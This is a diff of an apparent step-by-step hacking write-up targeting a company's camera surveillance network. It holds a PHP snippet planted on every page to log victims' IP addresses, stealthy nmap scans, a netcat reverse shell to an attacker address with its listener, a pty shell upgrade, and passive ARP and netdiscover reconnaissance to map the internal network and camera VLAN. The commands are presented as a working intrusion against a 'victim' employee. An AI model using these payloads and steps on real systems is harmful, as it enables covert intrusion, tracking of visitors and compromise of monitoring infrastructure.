@@ -32,37 +32,55 @@ Solution_Code
 ________________________________________
 Now, waiting for the click and booking a free session in the website. A PHP code is used PHP trick (PHP gets the visitor's IP address and saves all IPs in a file called visitors.txt). After one click on the website, it returns the victim <IP> because the website runs on (Apache HTTP Server).
 The code file name in web (log.php): The trick:
+
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
 file_put_contents("visitors.txt", $ip . "\n", FILE_APPEND);
 ?>
 To put this in all pages, a new file in the project is made called (header.php)
+
 It has inside:
 <?php include('log.php'); ?>
+
 To put this at the top of all pages to guarantee that if the victim enters any page, his IP address will be recorded.
 ________________________________________
 Now I have <IP> of the victim, that means I have the first step in the company to have access in camera monitor. Need to use a scanner:
 nmap -Pn -f -T1 -p 21,22,80,8080 <IP>
- 
+<img width="356" height="42" alt="nmap" src="https://github.com/user-attachments/assets/06082f29-6608-43e6-a12e-722b3a2fd494" />
+
 Now I have port 80 open.
+
 Let's open <IP>:80, a website works. Let's try to write a reverse shell in input in website to have access because the project is in the victim device.
 Reverse shell:
+
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> 2299>/tmp/f
 On Kali terminal write:
 nc -lnvp 2299
- 
+
+<img width="420" height="84" alt="nc" src="https://github.com/user-attachments/assets/d6602b2a-efa0-459f-af9f-db80224d7cd9" />
+
+
 It works. Now I have reverse shell in the victim employee in company — second step is done.
 ________________________________________
 
 After opening a channel between hacker and victim, let's take more privilege in her network and devices:
+
 Write the script in terminal:
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+
 Now need to check if victim uses what OS (Kali or Windows).
+
 Why? Because I need all IP in company with fewer tools because I don't want my fingerprint on the network. Passive mode is very important.
 Terminal command:
+1-
+
 arp -a (if it works that means the victim used Windows OS)
-arp -a shows a list of IP addresses on your local network and their associated MAC addresses plus which interface sees them. It helps identify which devices exist on the LAN and who is active. A hacker could use this information to map targets if they already have access to the network.
+
+arp -a shows a list of IP addresses on your local network and their associated MAC addresses plus which interface sees them. It helps 
+identify which devices exist on the LAN and who is active. A hacker could use this information to map targets if they already have access to the network.
 Now have all IP and MAC addresses for company without ping and still no one knows there's a hacker in Network of company.
+2- 
+
 If the OS is Kali:
 uname -a (if it works that means victim used Kali OS)
 Now first also need passive technique:
@@ -70,14 +88,20 @@ First need to know the name of network card:
 ip a
 Now know the name of network card that works in internal network in company.
 Second step:
+
 ping -c1 <IP> (This step to make sure all IP in network make ARP and flow to capture them)
 netdiscover -p -i eth0
+
 Now have all IP in company, and notes have VLAN in Network.
 ________________________________________
 After having the MAC address for all devices check the trick:
-The first 24 bits (6 hex digits) of the MAC address into a website like DNS Checker, macaddresslookup.io, or ipchecktool.com to find the company that made the network card (e.g., Apple, Samsung, Intel).
+
+The first 24 bits (6 hex digits) of the MAC address into a website like DNS Checker,
+macaddresslookup.io, or ipchecktool.com to find the company that made the network card (e.g., Apple, Samsung, Intel).
 Now I have name of camera in VLAN 5 and have server only for monitor and camera record.
+
 Let's map the IP of VLAN 5:
+
 nmap -f -Pn x.x.5.0/24 (To know all IP given for camera and the record server)
 ________________________________________
 In OT things need to know hardware control and hack camera device because have (BusyBox).
